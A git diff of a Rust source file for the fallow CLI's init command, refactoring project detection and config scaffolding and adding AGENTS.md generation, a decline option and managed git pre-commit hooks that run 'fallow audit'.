@@ -2,50 +2,199 @@ use std::path::Path;
 use std::process::ExitCode;
 
 use fallow_config::{ExternalPluginDef, FallowConfig, PackageJson};
+use fallow_engine::changed_files::clear_ambient_git_env;
 
 use crate::validate;
 
-// ── Project detection ──────────────────────────────────────────────
+const AGENTS_GUIDE_FILENAME: &str = "AGENTS.md";
+/// Static template used as the ground truth for the empty-project case and
+/// regression tests. Production code uses `build_agents_guide` instead.
+#[cfg(test)]
+const AGENTS_GUIDE_TEMPLATE: &str = r#"# AGENTS.md
+
+This file gives coding agents project-specific context. Keep it short and update it when workflows change.
+
+## Project Overview
+
+- Primary app or package:
+- Main entry points:
+- Important directories:
+
+## Architecture Notes
+
+- Module boundaries:
+- Generated or vendored code:
+- Sensitive areas:
+
+## Commands
+
+- Install:
+- Build:
+- Test:
+- Typecheck or lint:
+
+## Fallow
+
+- Use `fallow audit --format json --quiet` before committing AI-generated changes.
+- Use `fallow dead-code --format json --quiet`, `fallow dupes --format json --quiet`, and `fallow health --format json --quiet` for targeted checks.
+- Use `fallow list --entry-points --format json --quiet` and `fallow list --boundaries --format json --quiet` to inspect project shape.
+
+<!-- generated:task-matrix:start -->
+| When the agent is about to... | Run |
+|---|---|
+| delete an "unused" export or file | `fallow dead-code --trace <file>:<export>` |
+| prove a TypeScript symbol's exact consumers before refactoring | `fallow dead-code --type-aware --symbol-impact <file>:<export-or-class.method>` |
+| delete an "unused" dependency | `fallow dead-code --trace-dependency <name>` |
+| commit or open a PR | `fallow audit --base <ref>` |
+| prioritize refactoring | `fallow health --hotspots --targets` |
+| ask who owns code | `fallow health --ownership` |
+| check untested-but-reachable code | `fallow health --coverage-gaps` |
+| consolidate duplication | `fallow dupes --trace dup:<fingerprint>` |
+| find feature flags | `fallow flags` |
+| check which architecture rules apply to a file before changing it | `fallow guard <files>` |
+| surface security candidates | `fallow security` |
+| understand a finding | `fallow explain <issue-type>` |
+| scope a monorepo | `--workspace <glob> / --changed-workspaces <ref>` (global flags, prefix any command) |
+<!-- generated:task-matrix:end -->
+
+## Agent Rules
+
+- Do not edit:
+- Always ask before:
+- Preferred style:
+"#;
 
 /// Detected project characteristics used to tailor config scaffolding.
-struct ProjectInfo {
+pub struct ProjectInfo {
+    pub is_monorepo: bool,
+    pub workspace_patterns: Vec<String>,
+    pub workspace_tool: Option<String>,
+    pub has_typescript: bool,
+    pub test_framework: Option<String>,
+    pub ui_framework: Option<String>,
+    pub has_storybook: bool,
+    /// Canonical package manager parsed from the `packageManager` field in
+    /// `package.json` (the part before `@`, e.g. `"pnpm@9.1.0"` gives `pnpm`).
+    pub package_manager: Option<String>,
+    /// True when more than one of vitest / jest / @playwright/test is present
+    /// in the dependency name set. When true, `test_framework` holds the
+    /// first-match value but the AGENTS.md scaffold leaves `- Test:` blank
+    /// to avoid a confident mislabel.
+    pub test_framework_ambiguous: bool,
+    /// True when `node_modules/fallow/schema.json` exists at the project
+    /// root, meaning a version-aligned local schema is available. Drives the
+    /// `$schema` value emitted by `proposed_config_value` and
+    /// `generate_jsonc` (issue #1794): local path first (offline, no VS Code
+    /// untrusted-remote-schema prompt), falling back to the remote URL when
+    /// absent.
+    pub has_local_schema: bool,
+}
+
+/// Detected workspace shape: monorepo flag, package patterns, and tool name.
+struct WorkspaceShape {
     is_monorepo: bool,
-    workspace_patterns: Vec<String>,
-    workspace_tool: Option<String>,
-    has_typescript: bool,
-    test_framework: Option<String>,
-    ui_framework: Option<String>,
-    has_storybook: bool,
+    patterns: Vec<String>,
+    tool: Option<String>,
 }
 
 /// Inspect the project root and detect frameworks, workspace setup, etc.
-fn detect_project(root: &Path) -> ProjectInfo {
-    let is_pnpm = root.join("pnpm-workspace.yaml").exists();
+pub fn detect_project(root: &Path) -> ProjectInfo {
     let has_typescript = root.join("tsconfig.json").exists();
     let has_storybook = root.join(".storybook").is_dir();
+    let has_local_schema = has_local_schema_file(root);
 
     let pkg = PackageJson::load(&root.join("package.json")).ok();
 
-    // Workspace detection
-    let pkg_workspace_patterns = pkg
+    let workspace = detect_workspace_shape(root, pkg.as_ref());
+
+    let all_deps = collect_dependency_names(root, pkg.as_ref(), workspace.is_monorepo);
+
+    let (test_framework, test_framework_ambiguous) = detect_test_framework(&all_deps);
+    let ui_framework = detect_ui_framework(&all_deps);
+
+    // Extract just the manager name from `packageManager` (e.g. "pnpm@9.1.0" -> "pnpm").
+    let package_manager = pkg
         .as_ref()
-        .map(|p| p.workspace_patterns())
+        .and_then(|p| p.package_manager.as_deref())
+        .and_then(|pm| pm.split('@').next())
+        .filter(|s| !s.is_empty())
+        .map(str::to_owned);
+
+    ProjectInfo {
+        is_monorepo: workspace.is_monorepo,
+        workspace_patterns: workspace.patterns,
+        workspace_tool: workspace.tool,
+        has_typescript,
+        test_framework,
+        ui_framework,
+        has_storybook,
+        package_manager,
+        test_framework_ambiguous,
+        has_local_schema,
+    }
+}
+
+/// True when a version-aligned local config schema is available at
+/// `node_modules/fallow/schema.json` under `root`. Filesystem-only check
+/// (not the workspace-wide dependency union `collect_dependency_names`
+/// builds): in a pnpm monorepo where `fallow` is declared only in a
+/// workspace member, there is no root `node_modules/fallow`, so keying on
+/// this existence check avoids emitting a root-relative path that fails to
+/// resolve.
+pub fn has_local_schema_file(root: &Path) -> bool {
+    root.join("node_modules/fallow/schema.json").exists()
+}
+
+/// Collect dependency names from the root `package.json` plus, for a monorepo,
+/// every workspace member's `package.json`.
+///
+/// Framework and test-framework detection read this union so a monorepo whose
+/// frameworks live in workspace packages (the common case, e.g. Next.js in
+/// `apps/web` rather than the root) is detected, not just root-level tooling.
+/// Non-monorepo projects skip the workspace walk entirely and see only the root
+/// dependencies, so their detection is behavior-identical to before.
+///
+/// Workspace discovery is routed through the engine, not the config crate
+/// directly, per the `crates/cli` architecture boundary.
+pub fn collect_dependency_names(
+    root: &Path,
+    root_pkg: Option<&PackageJson>,
+    is_monorepo: bool,
+) -> Vec<String> {
+    let mut names: Vec<String> = root_pkg
+        .map(PackageJson::all_dependency_names)
         .unwrap_or_default();
+    if !is_monorepo {
+        return names;
+    }
+    for member in fallow_engine::discover::discover_workspace_packages(root) {
+        if member.root.as_path() == root {
+            continue;
+        }
+        if let Ok(pkg) = PackageJson::load(&member.root.join("package.json")) {
+            names.extend(pkg.all_dependency_names());
+        }
+    }
+    names.sort();
+    names.dedup();
+    names
+}
+
+/// Detect the monorepo flag, workspace package patterns, and workspace tool.
+fn detect_workspace_shape(root: &Path, pkg: Option<&PackageJson>) -> WorkspaceShape {
+    let is_pnpm = root.join("pnpm-workspace.yaml").exists();
+    let pkg_workspace_patterns = pkg.map(PackageJson::workspace_patterns).unwrap_or_default();
     let has_npm_workspaces = !pkg_workspace_patterns.is_empty();
 
-    let is_monorepo = is_pnpm || has_npm_workspaces;
-    let workspace_patterns = if is_pnpm && pkg_workspace_patterns.is_empty() {
-        // pnpm-workspace.yaml exists but no patterns in package.json;
-        // read pnpm-workspace.yaml directly for patterns.
+    let patterns = if is_pnpm && pkg_workspace_patterns.is_empty() {
         read_pnpm_workspace_patterns(root)
     } else {
         pkg_workspace_patterns
     };
 
-    let workspace_tool = if is_pnpm {
+    let tool = if is_pnpm {
         Some("pnpm".to_string())
     } else if has_npm_workspaces {
-        // Distinguish yarn vs npm by lockfile presence
         if root.join("yarn.lock").exists() {
             Some("yarn".to_string())
         } else {
@@ -55,23 +204,36 @@ fn detect_project(root: &Path) -> ProjectInfo {
         None
     };
 
-    // Dependency scanning
-    let all_deps = pkg
-        .as_ref()
-        .map(PackageJson::all_dependency_names)
-        .unwrap_or_default();
+    WorkspaceShape {
+        is_monorepo: is_pnpm || has_npm_workspaces,
+        patterns,
+        tool,
+    }
+}
 
-    let test_framework = if all_deps.iter().any(|d| d == "vitest") {
+/// Detect the primary test framework label and whether the choice is ambiguous
+/// (more than one of vitest / jest / @playwright/test present).
+fn detect_test_framework(all_deps: &[String]) -> (Option<String>, bool) {
+    let has_vitest = all_deps.iter().any(|d| d == "vitest");
+    let has_jest = all_deps.iter().any(|d| d == "jest");
+    let has_playwright = all_deps.iter().any(|d| d == "@playwright/test");
+    let count = u8::from(has_vitest) + u8::from(has_jest) + u8::from(has_playwright);
+
+    let framework = if has_vitest {
         Some("Vitest".to_string())
-    } else if all_deps.iter().any(|d| d == "jest") {
+    } else if has_jest {
         Some("Jest".to_string())
-    } else if all_deps.iter().any(|d| d == "@playwright/test") {
+    } else if has_playwright {
         Some("Playwright".to_string())
     } else {
         None
     };
+    (framework, count > 1)
+}
 
-    let ui_framework = if all_deps.iter().any(|d| d == "react" || d == "react-dom") {
+/// Detect the primary UI framework label from the dependency name set.
+fn detect_ui_framework(all_deps: &[String]) -> Option<String> {
+    if all_deps.iter().any(|d| d == "react" || d == "react-dom") {
         Some("React".to_string())
     } else if all_deps.iter().any(|d| d == "vue") {
         Some("Vue".to_string())
@@ -81,16 +243,6 @@ fn detect_project(root: &Path) -> ProjectInfo {
         Some("Angular".to_string())
     } else {
         None
-    };
-
-    ProjectInfo {
-        is_monorepo,
-        workspace_patterns,
-        workspace_tool,
-        has_typescript,
-        test_framework,
-        ui_framework,
-        has_storybook,
     }
 }
 
@@ -100,7 +252,6 @@ fn read_pnpm_workspace_patterns(root: &Path) -> Vec<String> {
     let Ok(content) = std::fs::read_to_string(&path) else {
         return Vec::new();
     };
-    // Simple YAML parsing: extract lines under `packages:` that start with `- `
     let mut patterns = Vec::new();
     let mut in_packages = false;
     for line in content.lines() {
@@ -116,7 +267,6 @@ fn read_pnpm_workspace_patterns(root: &Path) -> Vec<String> {
                     patterns.push(value.to_string());
                 }
             } else if !trimmed.is_empty() && !trimmed.starts_with('#') {
-                // No longer under `packages:` key
                 break;
             }
         }
@@ -125,90 +275,306 @@ fn read_pnpm_workspace_patterns(root: &Path) -> Vec<String> {
 }
 
 /// Build a JSON config string tailored to the detected project.
-fn build_json_config(info: &ProjectInfo) -> String {
-    let mut config = serde_json::json!({
-        "$schema": "https://raw.githubusercontent.com/fallow-rs/fallow/main/schema.json",
-    });
+///
+/// Used by `fallow init` (where this is the canonical scaffold) and by
+/// `fallow fix`'s missing-config fallback (so the seed file produced when
+/// auto-applying duplicate-export config rules matches what `fallow init`
+/// would have written, framework detection and all).
+#[expect(
+    clippy::expect_used,
+    reason = "init config is built from json literals and serializes infallibly"
+)]
+pub fn build_json_config(info: &ProjectInfo) -> String {
+    // The detection-derived base ($schema, entry, workspaces.patterns,
+    // ignorePatterns) comes from the shared `fallow recommend` core so init and
+    // recommend can never drift on it. init layers its human-oriented scaffold
+    // (the rules heuristic + the commented duplicates template) on top.
+    let mut config = crate::onboarding::proposed_config_value(info);
+    add_json_rules_config(&mut config, info);
 
-    // Entry patterns
-    let extensions = if info.has_typescript {
-        "{ts,tsx,js,jsx}"
-    } else {
-        "{js,jsx,mjs}"
-    };
-    config["entry"] = serde_json::json!([
-        format!("src/index.{extensions}"),
-        format!("src/main.{extensions}"),
-    ]);
+    let mut output = serde_json::to_string_pretty(&config)
+        .expect("config built from json! literals is always serializable");
+    insert_json_duplicates_template(&mut output);
+    insert_json_header_comment(&mut output);
+    output.push('\n');
+    output
+}
 
-    // Workspace patterns
-    if info.is_monorepo && !info.workspace_patterns.is_empty() {
-        config["workspaces"] = serde_json::json!({
-            "packages": info.workspace_patterns,
-        });
-    }
+/// Prepend a one-line JSONC-provenance comment so readers know the `//` comments
+/// are intentional: fallow parses `.fallowrc.json` as JSONC, but generic JSON
+/// tooling (editor linters, `JSON.parse`) may reject the comments. `$schema` is
+/// always the first key, so the anchor is stable.
+fn insert_json_header_comment(output: &mut String) {
+    *output = output.replacen(
+        "{\n  \"$schema\":",
+        "{\n  // This file is JSONC: fallow reads these comments; generic JSON tools may not.\n  \"$schema\":",
+        1,
+    );
+}
 
-    // Ignore patterns
-    let mut ignore = Vec::new();
-    if info.has_storybook {
-        ignore.push(".storybook/**");
-    }
-    if !ignore.is_empty() {
-        config["ignorePatterns"] = serde_json::json!(ignore);
-    }
-
-    // Rules
+fn add_json_rules_config(config: &mut serde_json::Value, info: &ProjectInfo) {
     let mut rules = serde_json::Map::new();
     if info.test_framework.is_some() {
         rules.insert("unused-dependencies".to_string(), serde_json::json!("warn"));
     }
     config["rules"] = serde_json::Value::Object(rules);
+}
 
-    // serde_json pretty-print + trailing newline
-    let mut output = serde_json::to_string_pretty(&config)
-        .expect("config built from json! literals is always serializable");
-    output.push('\n');
-    output
+fn insert_json_duplicates_template(output: &mut String) {
+    *output = output.replacen(
+        "  \"rules\":",
+        "  \"duplicates\": {\n    // Hide pair-only clones; focus on widespread copy-paste\n    // worth refactoring. Lower to 2 to report every duplicate pair.\n    \"minOccurrences\": 3\n    // Common additions (uncomment to enable):\n    // \"ignore\": [\n    //   \"**/lib/**\",          // for repos that publish transpiled output to lib/\n    //   \"**/legacy/**\",       // for repos with legacy-build artifacts\n    //   \"**/__generated__/**\", // Relay, GraphQL Code Generator\n    //   \"**/generated/**\"     // OpenAPI, Protobuf codegen\n    // ]\n  },\n  \"rules\":",
+        1,
+    );
+}
+
+/// Build an AGENTS.md guide string tailored to the detected project.
+///
+/// Prefill rules:
+/// - `Primary app or package:` is always blank (human-judgment field).
+/// - `Module boundaries:` is filled for monorepos only; the tool label uses
+///   the same trust ladder as `Install:` (a lockfile-default-sniffed
+///   yarn/npm `workspace_tool` stays unlabeled, e.g. a Bun workspace must
+///   not read "npm workspaces").
+/// - No UI-framework or Storybook lines (presence-based, misfire on peer deps).
+/// - A provenance HTML comment is emitted under `## Commands` only when at
+///   least one Commands line is prefilled.
+/// - `Install:` from `package_manager` when Some; else from `workspace_tool`
+///   when it is `pnpm` (driven by pnpm-workspace.yaml, reliable); else blank.
+/// - `Test:` only when `test_framework` is Some AND not ambiguous; capitalized.
+/// - `Typecheck or lint:` filled with `tsc --noEmit` only when `has_typescript`.
+pub fn build_agents_guide(info: &ProjectInfo) -> String {
+    let prefill = build_agents_guide_prefill(info);
+
+    format!(
+        r"# AGENTS.md
+
+This file gives coding agents project-specific context. Keep it short and update it when workflows change.
+
+## Project Overview
+
+- Primary app or package:
+- Main entry points:
+- Important directories:
+
+## Architecture Notes
+
+- Module boundaries:{module_boundaries_suffix}
+- Generated or vendored code:
+- Sensitive areas:
+
+## Commands
+
+{provenance_comment}- Install:{install_suffix}
+- Build:
+- Test:{test_suffix}
+- Typecheck or lint:{typecheck_suffix}
+
+## Fallow
+
+- Use `fallow audit --format json --quiet` before committing AI-generated changes.
+- Use `fallow dead-code --format json --quiet`, `fallow dupes --format json --quiet`, and `fallow health --format json --quiet` for targeted checks.
+- Use `fallow list --entry-points --format json --quiet` and `fallow list --boundaries --format json --quiet` to inspect project shape.
+
+{task_matrix_block}
+
+## Agent Rules
+
+- Do not edit:
+- Always ask before:
+- Preferred style:
+",
+        module_boundaries_suffix = space_prefixed(&prefill.module_boundaries),
+        provenance_comment = prefill.provenance_comment,
+        install_suffix = space_prefixed(&prefill.install_line),
+        test_suffix = space_prefixed(&prefill.test_line),
+        typecheck_suffix = space_prefixed(&prefill.typecheck_line),
+        task_matrix_block = prefill.task_matrix_block,
+    )
+}
+
+struct AgentsGuidePrefill {
+    install_line: String,
+    test_line: String,
+    typecheck_line: String,
+    provenance_comment: &'static str,
+    module_boundaries: String,
+    task_matrix_block: String,
+}
+
+fn build_agents_guide_prefill(info: &ProjectInfo) -> AgentsGuidePrefill {
+    let install_line = agents_install_line(info);
+    let test_line = agents_test_line(info);
+    let typecheck_line = if info.has_typescript {
+        "tsc --noEmit".to_string()
+    } else {
+        String::new()
+    };
+
+    let any_commands_prefilled =
+        !install_line.is_empty() || !test_line.is_empty() || !typecheck_line.is_empty();
+
+    let provenance_comment = if any_commands_prefilled {
+        "<!-- fallow init prefilled these from package.json; confirm before relying on them -->\n"
+    } else {
+        ""
+    };
+
+    let module_boundaries = agents_module_boundaries_line(info);
+
+    // The task-to-command matrix is static (not project-derived), rendered
+    // from the single `crate::task_matrix::TASK_MATRIX` slice so it stays in
+    // sync with the agent-hook managed block, the schema manifest, and the
+    // generated SKILL.md section. Wrapped in the same `generated:task-matrix`
+    // markers so `scripts/generate-agent-docs.mjs` can regenerate it in place.
+    let task_matrix_block = format!(
+        "<!-- generated:task-matrix:start -->\n{}<!-- generated:task-matrix:end -->",
+        crate::task_matrix::render_task_matrix_markdown()
+    );
+
+    AgentsGuidePrefill {
+        install_line,
+        test_line,
+        typecheck_line,
+        provenance_comment,
+        module_boundaries,
+        task_matrix_block,
+    }
+}
+
+/// Return `""` for an empty value, otherwise `" {value}"`. Used to splice an
+/// optional prefilled value after a fixed `- Field:` label in AGENTS.md.
+fn space_prefixed(value: &str) -> String {
+    if value.is_empty() {
+        String::new()
+    } else {
+        format!(" {value}")
+    }
+}
+
+/// Compute the `Install:` value for the AGENTS.md Commands section.
+///
+/// Prefers `package_manager` (canonical field in package.json), falls back to
+/// `workspace_tool == "pnpm"` (inferred from pnpm-workspace.yaml). Never
+/// emits a lockfile-sniffed `yarn install`/`npm install` to avoid false
+/// labelling.
+fn agents_install_line(info: &ProjectInfo) -> String {
+    if let Some(pm) = &info.package_manager {
+        return format!("{pm} install");
+    }
+    if info.workspace_tool.as_deref() == Some("pnpm") {
+        return "pnpm install".to_string();
+    }
+    String::new()
+}
+
+/// Compute the `Test:` value for the AGENTS.md Commands section.
+///
+/// Returns the capitalized framework name only when exactly one framework is
+/// detected. Returns an empty string when the framework is ambiguous or absent.
+fn agents_test_line(info: &ProjectInfo) -> String {
+    if info.test_framework_ambiguous {
+        return String::new();
+    }
+    info.test_framework.clone().unwrap_or_default()
+}
+
+/// Compute the `Module boundaries:` suffix for the Architecture Notes section.
+///
+/// Returns a string like `pnpm workspaces (packages/*, apps/*)` for monorepos,
+/// or an empty string for non-monorepos. The tool label follows the same trust
+/// ladder as [`agents_install_line`]: the `packageManager` field, then pnpm
+/// (driven by pnpm-workspace.yaml). The lockfile-default-sniffed yarn/npm
+/// values of `workspace_tool` are NOT used, because they confidently mislabel
+/// e.g. Bun workspaces (package.json `workspaces` + bun.lock) as
+/// "npm workspaces"; those emit the tool-neutral `workspaces (...)` form.
+fn agents_module_boundaries_line(info: &ProjectInfo) -> String {
+    if !info.is_monorepo || info.workspace_patterns.is_empty() {
+        return String::new();
+    }
+    let patterns = info.workspace_patterns.join(", ");
+    let tool = info
+        .package_manager
+        .as_deref()
+        .or_else(|| (info.workspace_tool.as_deref() == Some("pnpm")).then_some("pnpm"));
+    match tool {
+        Some(tool) => format!("{tool} workspaces ({patterns})"),
+        None => format!("workspaces ({patterns})"),
+    }
+}
+
+/// Render a JSON string array as a TOML inline array of double-quoted strings.
+///
+/// Used to render the detection-derived arrays (`entry`, `ignorePatterns`,
+/// `workspaces.patterns`) sourced from the shared recommend core into the TOML
+/// scaffold. The values are globs with no `"`/`\` characters, so a simple quote
+/// wrap is sufficient (matching the JSON scaffold's rendering of the same data).
+fn toml_string_array(values: &[serde_json::Value]) -> String {
+    let items: Vec<String> = values
+        .iter()
+        .filter_map(serde_json::Value::as_str)
+        .map(|s| format!("\"{s}\""))
+        .collect();
+    format!("[{}]", items.join(", "))
 }
 
 /// Build a TOML config string tailored to the detected project.
+///
+/// The detection-derived values (entry, ignorePatterns, workspaces.patterns) are
+/// read from the shared `fallow recommend` core (`onboarding::proposed_config_value`)
+/// so the TOML scaffold can never drift from the JSON scaffold or from
+/// `fallow recommend`. Sourcing from that value is also what keeps the loader's
+/// `patterns` key correct: the loader's `WorkspaceConfig` field is `patterns`, so
+/// a `packages` key would be silently dropped, losing monorepo scoping.
 fn build_toml_config(info: &ProjectInfo) -> String {
+    let base = crate::onboarding::proposed_config_value(info);
+
     let mut lines = vec![
         "# fallow.toml - Codebase analysis configuration".to_string(),
         "# See https://docs.fallow.tools for documentation".to_string(),
         String::new(),
     ];
 
-    // Entry patterns
-    let extensions = if info.has_typescript {
-        "{ts,tsx,js,jsx}"
-    } else {
-        "{js,jsx,mjs}"
-    };
-    lines.push(format!(
-        "entry = [\"src/index.{extensions}\", \"src/main.{extensions}\"]"
-    ));
-
-    // Ignore patterns
-    if info.has_storybook {
-        lines.push("ignorePatterns = [\".storybook/**\"]".to_string());
+    if let Some(entry) = base.get("entry").and_then(serde_json::Value::as_array) {
+        lines.push(format!("entry = {}", toml_string_array(entry)));
+    }
+    if let Some(ignore) = base
+        .get("ignorePatterns")
+        .and_then(serde_json::Value::as_array)
+    {
+        lines.push(format!("ignorePatterns = {}", toml_string_array(ignore)));
     }
 
     lines.push(String::new());
 
-    // Workspace patterns
-    if info.is_monorepo && !info.workspace_patterns.is_empty() {
+    if let Some(patterns) = base
+        .get("workspaces")
+        .and_then(|w| w.get("patterns"))
+        .and_then(serde_json::Value::as_array)
+    {
         lines.push("[workspaces]".to_string());
-        let patterns_str: Vec<String> = info
-            .workspace_patterns
-            .iter()
-            .map(|p| format!("\"{p}\""))
-            .collect();
-        lines.push(format!("packages = [{}]", patterns_str.join(", ")));
+        lines.push(format!("patterns = {}", toml_string_array(patterns)));
         lines.push(String::new());
     }
 
-    // Rules
+    lines.push("[duplicates]".to_string());
+    lines.push(
+        "# Hide pair-only clones; focus on widespread copy-paste worth refactoring.".to_string(),
+    );
+    lines.push("# Lower to 2 to report every duplicate pair.".to_string());
+    lines.push("minOccurrences = 3".to_string());
+    lines.push("# Common additions (uncomment to enable):".to_string());
+    lines.push("# ignore = [".to_string());
+    lines.push(
+        "#   \"**/lib/**\",          # for repos that publish transpiled output to lib/"
+            .to_string(),
+    );
+    lines.push("#   \"**/legacy/**\",       # for repos with legacy-build artifacts".to_string());
+    lines.push("#   \"**/__generated__/**\", # Relay, GraphQL Code Generator".to_string());
+    lines.push("#   \"**/generated/**\"     # OpenAPI, Protobuf codegen".to_string());
+    lines.push("# ]".to_string());
+    lines.push(String::new());
+
     lines.push(
         "# Per-issue-type severity: \"error\" (fail CI), \"warn\" (report only), \"off\" (ignore)"
             .to_string(),
@@ -226,7 +592,6 @@ fn build_toml_config(info: &ProjectInfo) -> String {
 fn print_detection_summary(info: &ProjectInfo) {
     let mut detections = Vec::new();
 
-    // Project type line
     let type_label = if info.has_typescript {
         "TypeScript"
     } else {
@@ -239,7 +604,6 @@ fn print_detection_summary(info: &ProjectInfo) {
         detections.push(type_label.to_string());
     }
 
-    // Frameworks line
     let mut frameworks = Vec::new();
     if let Some(test) = &info.test_framework {
         frameworks.push(test.as_str());
@@ -258,7 +622,6 @@ fn print_detection_summary(info: &ProjectInfo) {
         eprintln!("  Detected: {detection}");
     }
 
-    // Summary of config customizations
     let mut customizations = Vec::new();
     if info.is_monorepo && !info.workspace_patterns.is_empty() {
         customizations.push("workspace patterns");
@@ -278,20 +641,73 @@ fn print_detection_summary(info: &ProjectInfo) {
 pub struct InitOptions<'a> {
     pub root: &'a Path,
     pub use_toml: bool,
+    pub agents: bool,
     pub hooks: bool,
     pub branch: Option<&'a str>,
+    pub decline: bool,
+    pub quiet: bool,
+}
+
+/// Options for installing a managed Git pre-commit hook.
+pub struct GitHooksInstallOptions<'a> {
+    pub root: &'a Path,
+    pub branch: Option<&'a str>,
+    pub dry_run: bool,
+    pub force: bool,
+}
+
+/// Options for uninstalling a managed Git pre-commit hook.
+pub struct GitHooksUninstallOptions<'a> {
+    pub root: &'a Path,
+    pub dry_run: bool,
+    pub force: bool,
 }
 
 pub fn run_init(opts: &InitOptions<'_>) -> ExitCode {
+    if opts.decline {
+        return run_init_decline(opts.root, opts.quiet);
+    }
+    if opts.agents {
+        return run_init_agents(opts.root);
+    }
     if opts.hooks {
-        return run_init_hooks(opts.root, opts.branch);
+        return run_git_hooks_install(&GitHooksInstallOptions {
+            root: opts.root,
+            branch: opts.branch,
+            dry_run: false,
+            force: false,
+        });
     }
     run_init_config(opts.root, opts.use_toml)
 }
 
+/// `init --decline`: persist a deliberate "stay unconfigured" decision so the
+/// first-contact setup hint and the `setup` next-step stop appearing for this
+/// project. Storage is a field in the existing Impact store under `.fallow/`
+/// (no new state file); this neither enables Impact tracking nor writes a
+/// config file.
+fn run_init_decline(root: &Path, quiet: bool) -> ExitCode {
+    let newly = crate::impact::decline_onboarding(root);
+    if !quiet {
+        println!(
+            "{}",
+            if newly {
+                "Fallow setup hints disabled for this project."
+            } else {
+                "Fallow setup hints were already disabled for this project."
+            }
+        );
+    }
+    ExitCode::SUCCESS
+}
+
 fn run_init_config(root: &Path, use_toml: bool) -> ExitCode {
-    // Check if any config file already exists
-    let existing_names = [".fallowrc.json", "fallow.toml", ".fallow.toml"];
+    let existing_names = [
+        ".fallowrc.json",
+        ".fallowrc.jsonc",
+        "fallow.toml",
+        ".fallow.toml",
+    ];
     for name in &existing_names {
         let path = root.join(name);
         if path.exists() {
@@ -326,6 +742,24 @@ fn run_init_config(root: &Path, use_toml: bool) -> ExitCode {
     ExitCode::SUCCESS
 }
 
+fn run_init_agents(root: &Path) -> ExitCode {
+    let agents_path = root.join(AGENTS_GUIDE_FILENAME);
+    if agents_path.exists() {
+        eprintln!("{AGENTS_GUIDE_FILENAME} already exists");
+        return ExitCode::from(2);
+    }
+
+    let info = detect_project(root);
+    let guide = build_agents_guide(&info);
+    if let Err(e) = std::fs::write(&agents_path, guide) {
+        eprintln!("Error: Failed to write {AGENTS_GUIDE_FILENAME}: {e}");
+        return ExitCode::from(2);
+    }
+
+    eprintln!("Created {AGENTS_GUIDE_FILENAME}");
+    ExitCode::SUCCESS
+}
+
 /// Ensure `.fallow/` is listed in the project's `.gitignore`.
 ///
 /// If `.gitignore` exists and already contains `.fallow` (with or without
@@ -335,7 +769,6 @@ fn ensure_gitignore(root: &Path) {
     let gitignore_path = root.join(".gitignore");
     let existing = std::fs::read_to_string(&gitignore_path).unwrap_or_default();
 
-    // Check if .fallow is already ignored (with or without trailing slash).
     let already_ignored = existing.lines().any(|line| {
         let trimmed = line.trim();
         trimmed == ".fallow" || trimmed == ".fallow/"
@@ -345,12 +778,8 @@ fn ensure_gitignore(root: &Path) {
         return;
     }
 
-    // Build the line to append.
     let is_new = existing.is_empty();
-    let entry = if is_new {
-        // New file — no leading newline needed.
-        ".fallow/\n"
-    } else if existing.ends_with('\n') {
+    let entry = if is_new || existing.ends_with('\n') {
         ".fallow/\n"
     } else {
         "\n.fallow/\n"
@@ -373,12 +802,12 @@ fn ensure_gitignore(root: &Path) {
 
 /// Detect the default branch name by querying git.
 fn detect_default_branch(root: &Path) -> Option<String> {
-    // Try `git symbolic-ref refs/remotes/origin/HEAD` first (most reliable).
-    let output = std::process::Command::new("git")
+    let mut command = std::process::Command::new("git");
+    command
         .args(["symbolic-ref", "refs/remotes/origin/HEAD"])
-        .current_dir(root)
-        .output()
-        .ok()?;
+        .current_dir(root);
+    clear_ambient_git_env(&mut command);
+    let output = command.output().ok()?;
     if output.status.success() {
         let full_ref = String::from_utf8(output.stdout).ok()?;
         return full_ref
@@ -389,8 +818,76 @@ fn detect_default_branch(root: &Path) -> Option<String> {
     None
 }
 
-fn run_init_hooks(root: &Path, branch: Option<&str>) -> ExitCode {
-    // Validate --branch to prevent shell injection in the generated hook script.
+pub const GIT_HOOK_MARKER: &str = "# Generated by fallow hooks install --target git.";
+
+/// Hint printed when an existing pre-commit hook prevents installation.
+/// Mirrors the resolution block emitted by [`run_git_hooks_install`] so the
+/// caller can paste it into their existing hook by hand.
+fn existing_hook_hint(hook_path: &str, fallback_base_ref: &str) -> String {
+    format!(
+        r#"Error: {hook_path} already exists. Add the following block to your existing hook:
+
+  command -v fallow >/dev/null 2>&1 || exit 0
+  UPSTREAM="$(git rev-parse --abbrev-ref --symbolic-full-name '@{{upstream}}' 2>/dev/null || true)"
+  if [ -n "$UPSTREAM" ]; then
+    BASE="$(git merge-base "$UPSTREAM" HEAD 2>/dev/null || echo "$UPSTREAM")"
+  else
+    BASE="{fallback_base_ref}"
+  fi
+  fallow audit --base "$BASE" --quiet --gate-marker pre-commit"#
+    )
+}
+
+/// Hint printed when Lefthook is the active hook manager. Embeds the same
+/// resolution block as the standalone hook script under a `run: |` scalar.
+fn lefthook_hint(fallback_base_ref: &str) -> String {
+    format!(
+        r#"Lefthook detected. Add the following to your lefthook.yml:
+
+  pre-commit:
+    commands:
+      fallow:
+        run: |
+          command -v fallow >/dev/null 2>&1 || exit 0
+          UPSTREAM="$(git rev-parse --abbrev-ref --symbolic-full-name '@{{upstream}}' 2>/dev/null || true)"
+          if [ -n "$UPSTREAM" ]; then
+            BASE="$(git merge-base "$UPSTREAM" HEAD 2>/dev/null || echo "$UPSTREAM")"
+          else
+            BASE="{fallback_base_ref}"
+          fi
+          fallow audit --base "$BASE" --quiet --gate-marker pre-commit"#
+    )
+}
+
+enum HookTarget {
+    Husky(std::path::PathBuf),
+    Lefthook,
+    GitHooks(std::path::PathBuf),
+}
+
+fn detect_hook_target(root: &Path) -> Result<HookTarget, ExitCode> {
+    if root.join(".husky").is_dir() {
+        Ok(HookTarget::Husky(root.join(".husky/pre-commit")))
+    } else if root.join(".lefthook").is_dir()
+        || root.join("lefthook.yml").exists()
+        || root.join("lefthook.json").exists()
+    {
+        Ok(HookTarget::Lefthook)
+    } else if root.join(".git/hooks").is_dir() {
+        Ok(HookTarget::GitHooks(root.join(".git/hooks/pre-commit")))
+    } else {
+        eprintln!(
+            "Error: No .git directory found. Run `git init` first, or use --hooks \
+             from the repository root."
+        );
+        Err(ExitCode::from(2))
+    }
+}
+
+pub fn run_git_hooks_install(opts: &GitHooksInstallOptions<'_>) -> ExitCode {
+    let root = opts.root;
+    let branch = opts.branch;
+
     if let Some(b) = branch
         && let Err(e) = validate::validate_git_ref(b)
     {
@@ -398,90 +895,175 @@ fn run_init_hooks(root: &Path, branch: Option<&str>) -> ExitCode {
         return ExitCode::from(2);
